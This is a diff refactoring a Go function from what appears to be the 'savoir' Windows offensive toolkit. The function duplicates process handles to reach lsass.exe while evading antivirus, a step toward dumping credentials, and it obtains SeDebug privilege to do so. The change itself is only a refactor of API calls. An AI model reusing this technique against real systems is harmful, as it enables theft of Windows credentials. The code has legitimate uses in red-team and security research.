@@ -6,9 +6,7 @@ import (
 	sys_windows "golang.org/x/sys/windows"
 
 	"github.com/vincd/savoir/windows/kernel32"
-	"github.com/vincd/savoir/windows/ntdll"
 )
-
 
 // From the article "Duping AV with handles", we try to duplicate handle on
 // any process
@@ -17,7 +15,7 @@ func FindProcessHandles(processName string) ([]sys_windows.Handle, error) {
 	lowerProcessName := strings.ToLower(processName)
 
 	// 1. Get debug privileges.
-	if err := ntdll.AskPrivilege(ntdll.SE_DEBUG); err != nil {
+	if err := AskPrivilegeSeDebug(); err != nil {
 		return nil, err
 	}
 
@@ -53,8 +51,8 @@ func FindProcessHandles(processName string) ([]sys_windows.Handle, error) {
 		// 4. NtDuplicateObject will get a copy of the handle of the remote
 		// process to our process. Recommended to pass at least PROCESS_VM_READ
 		// for DesiredAccess.
-		var duplicateHandle ntdll.Handle
-		status := ntdll.NtDuplicateObject(ntdll.Handle(processHandle), ntdll.Handle(handleInfo.HandleValue), ntdll.Handle(currentProcessHandle), &duplicateHandle, sys_windows.PROCESS_QUERY_INFORMATION|sys_windows.PROCESS_VM_READ, 0, 0)
+		var duplicateHandle sys_windows.Handle
+		status := DuplicateObject(processHandle, sys_windows.Handle(handleInfo.HandleValue), currentProcessHandle, &duplicateHandle, sys_windows.PROCESS_QUERY_INFORMATION|sys_windows.PROCESS_VM_READ, 0, 0)
 		if !status.IsSuccess() {
 			// fmt.Printf("Cannot duplicate object for %d and handle %d\n", handleInfo.UniqueProcessID, handleInfo.HandleValue)
 			continue
@@ -64,9 +62,9 @@ func FindProcessHandles(processName string) ([]sys_windows.Handle, error) {
 		// 5. NtQueryObject will tell us if this handle is a Process handle or
 		// something else.
 		// (there are a lot of types, and OMG GUESS WHAT IT'S NOT DOCUMENTED)
-		objInfo, status := ntdll.QueryObject(duplicateHandle, ntdll.ObjectTypeInformation)
+		objInfo, status := QueryObjectTypeInformation(duplicateHandle)
 		if !status.IsSuccess() {
-			sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
+			sys_windows.CloseHandle(duplicateHandle)
 			continue
 		}
 
@@ -74,19 +72,19 @@ func FindProcessHandles(processName string) ([]sys_windows.Handle, error) {
 			// 7. If it's a process handle, QueryFullProcessImageName invoked
 			// with the handle will show the process executable path. If it's
 			// lsass.exe then we have found a good match and can begin parsing.
-			processName, err := kernel32.QueryFullProcessImageName(sys_windows.Handle(duplicateHandle), 0)
+			processName, err := kernel32.QueryFullProcessImageName(duplicateHandle, 0)
 			if err != nil {
-				sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
+				sys_windows.CloseHandle(duplicateHandle)
 				// fmt.Printf("Cannot query full process image name for pid %d: %s\n", handleInfo.UniqueProcessID, err)
 				continue
 			}
 
 			if !strings.Contains(strings.ToLower(processName), lowerProcessName) {
-				sys_windows.CloseHandle(sys_windows.Handle(duplicateHandle))
+				sys_windows.CloseHandle(duplicateHandle)
 				continue
 			}
 
-			handles = append(handles, sys_windows.Handle(duplicateHandle))
+			handles = append(handles, duplicateHandle)
 		}
 	}
 
